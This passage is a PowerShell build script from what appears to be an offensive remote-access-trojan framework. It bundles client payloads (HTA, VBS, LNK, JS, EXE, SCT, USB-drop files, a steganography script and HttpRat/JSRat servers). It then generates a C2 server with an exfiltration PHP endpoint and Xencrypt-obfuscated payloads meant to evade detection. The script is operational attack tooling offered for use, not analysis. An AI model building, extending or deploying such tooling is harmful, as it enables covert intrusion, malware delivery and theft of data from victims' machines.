copy $evilimage .\png\OLD.png
move .\stego.ps1 .\png
move .\png "$ScriptDir\Package\Client"
move .\hta "$ScriptDir\Package\Client"
move .\vbs "$ScriptDir\Package\Client"
move .\Wordpad.lnk .\lnk
move .\Explorer.lnk .\lnk
move .\Windows.lnk .\lnk
move .\Folder.lnk .\lnk
move .\$lnkname .\usb
move .\lnk "$ScriptDir\Package\Client"
move .\xls "$ScriptDir\Package\Client"
move .\js "$ScriptDir\Package\Client"
move .\exe "$ScriptDir\Package\Client"
move .\sct "$ScriptDir\Package\Client"
move .\usb "$ScriptDir\Package\Client"
move .\c2c "$ScriptDir\Package\Client"
move .\zxd "$ScriptDir\Package\Client"
copy "$ScriptDir\Build\HttpRatServer.ps1" "$ScriptDir\Package\Client"
copy "$ScriptDir\Build\JSRatServer.ps1" "$ScriptDir\Package\Client"

#Write-Host "Clean tasks"
Write-Host "---- FINISH ------> 100 %" -ForegroundColor Yellow;

Write-Host "CONTENT GENERATED IN FOLDER c2c MUST BE COPY&PASTE IN THE LINKFOLDER OF YOUR ACTUAL Server"

$ooo = Read-Host -Prompt 'OK'
}

#################  SERVER C2 ENCRYPTION #############################################
$ScriptDir = Split-Path $script:MyInvocation.MyCommand.Path
Get-Content "$ScriptDir\config.ini" | ForEach-Object -Begin {$settings=@{}} -Process {$store = [regex]::split($_,'='); if(($store[0].CompareTo("") -ne 0) -and ($store[0].StartsWith("[") -ne $True) -and ($store[0].StartsWith("#") -ne $True)) {$settings.Add($store[0], $store[1])}}
$linkfolder = $settings.Get_Item("linkfolder")

$choice2 = Read-Host -Prompt 'Do you want to generate C2 Server files ? (y/n)'
if ($choice2 -eq "y") {

If (Test-Path  $ScriptDir\Package\Server){ Remove-Item -path $ScriptDir\Package\Server }
New-Item -Path $ScriptDir\Package -Name "Server" -ItemType "directory"
md $ScriptDir\Package\Server\$linkfolder
md $ScriptDir\Package\Server\exfil
md $ScriptDir\Package\Server\ui
Import-Module $ScriptDir\Build\xencrypt.ps1
$ScriptDir = Split-Path $script:MyInvocation.MyCommand.Path
copy $ScriptDir\www\exfil.php $ScriptDir\Package\Server
copy $ScriptDir\www\index.html $ScriptDir\Package\Server
copy $ScriptDir\www\exfil\*.* $ScriptDir\Package\Server\exfil
copy $ScriptDir\www\ui\* $ScriptDir\Package\Server\ui
# Link Folder
copy $ScriptDir\www\link\*.html $ScriptDir\Package\Server\$linkfolder
copy $ScriptDir\www\link\*.php $ScriptDir\Package\Server\$linkfolder
copy $ScriptDir\www\link\*.png $ScriptDir\Package\Server\$linkfolder
copy $ScriptDir\www\link\*.xml $ScriptDir\Package\Server\$linkfolder
copy $ScriptDir\www\link\*.psm1 $ScriptDir\Package\Server\$linkfolder
copy $ScriptDir\www\link\*.psm1 $ScriptDir\Package\Server\$linkfolder
copy $ScriptDir\www\link\*.css $ScriptDir\Package\Server\$linkfolder
copy $ScriptDir\www\link\*.ps1 $ScriptDir\Package\Server\$linkfolder
copy $ScriptDir\www\link\*.vbs $ScriptDir\Package\Server\$linkfolder

#$extensionArray = "ps1","txt"
$extensionArray = "txt"
foreach ($extension in $extensionArray) {
	Get-ChildItem -Path $ScriptDir\www\link -Recurse -ErrorAction SilentlyContinue -Filter *.$extension |  Where-Object { $_.Extension -eq ".$extension" }|foreach {$path = Resolve-Path $_.FullName ; Invoke-Xencrypt -InFile $path -OutFile "$ScriptDir\Package\Server\$linkfolder\$_" -Iterations 3; $path}  
	}
	
if ($choice1 -eq "y") {
	$ScriptDir = Split-Path $script:MyInvocation.MyCommand.Path
	copy $ScriptDir\Package\Client\c2c\*.* $ScriptDir\Package\Server\$linkfolder
}

Write-Host "READY ?" -ForegroundColor DarkGreen;
$ooo = Read-Host -Prompt 'PRESS ANY KEY TO CLOSE' 
}


<##>






















